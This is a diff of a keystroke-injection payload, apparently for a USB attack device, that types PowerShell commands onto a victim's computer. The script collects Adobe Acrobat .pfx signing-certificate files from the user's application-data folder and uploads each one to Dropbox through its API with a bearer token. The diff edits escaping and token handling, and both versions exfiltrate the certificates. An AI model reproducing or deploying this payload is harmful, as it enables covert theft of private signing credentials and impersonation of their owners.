@@ -25,43 +25,37 @@ QUACK STRING PowerShell
 QUACK DELAY 2000
 
 # Settings about Adobe Reader
-QUACK STRING $roamingFolderPath = [Environment]::GetFolderPath('ApplicationData')
+QUACK STRING \$roamingFolderPath = [Environment]::GetFolderPath('ApplicationData')
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $securityFolderPath = Join-Path -Path $roamingFolderPath -ChildPath 'Adobe\Acrobat\DC\Security'
+QUACK STRING \$securityFolderPath = Join-Path -Path \$roamingFolderPath -ChildPath 'Adobe\Acrobat\DC\Security'
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $pfxFiles = Get-ChildItem -Path $securityFolderPath -Filter '*.pfx' -File
+QUACK STRING \$pfxFiles = Get-ChildItem -Path \$securityFolderPath -Filter '*.pfx' -File
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $accessToken='$DROPBOX_ACCESS_TOKEN'
+QUACK STRING \$uploadUrl = 'https://content.dropboxapi.com/2/files/upload'
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $authHeader = @{Authorization = 'Bearer $accessToken'}
+QUACK STRING foreach (\$file in \$pfxFiles) {
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $uploadUrl = 'https://content.dropboxapi.com/2/files/upload'
+QUACK STRING \$dropboxFilePath = '/\$file'
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING foreach ($file in $pfxFiles) {
+QUACK STRING \$headers = @{}
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $dropboxFilePath = '/$file'
+QUACK STRING \$headers.Add('Authorization', 'Bearer $DROPBOX_ACCESS_TOKEN')
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $headers = @{}
+QUACK STRING \$headers.Add('Dropbox-API-Arg', '{\"path\":\"' + \$dropboxFilePath + '\",\"mode\":\"add\",\"autorename\":true,\"mute\":false}')
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $headers.Add('Authorization', 'Bearer $accessToken')
+QUACK STRING \$headers.Add('Content-Type', 'application/octet-stream')
 QUACK ENTER
 QUACK DELAY 500
-QUACK STRING $headers.Add('Dropbox-API-Arg', '{\"path\":\"' + $dropboxFilePath + '\",\"mode\":\"add\",\"autorename\":true,\"mute\":false}')
-QUACK ENTER
-QUACK DELAY 500
-QUACK STRING $headers.Add('Content-Type', 'application/octet-stream')
-QUACK ENTER
-QUACK DELAY 500
-QUACK STRING Invoke-RestMethod -Uri $uploadUrl -Headers $headers -Method Post -Body $file
+QUACK STRING Invoke-RestMethod -Uri \$uploadUrl -Headers \$headers -Method Post -Body \$file
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING }; exit
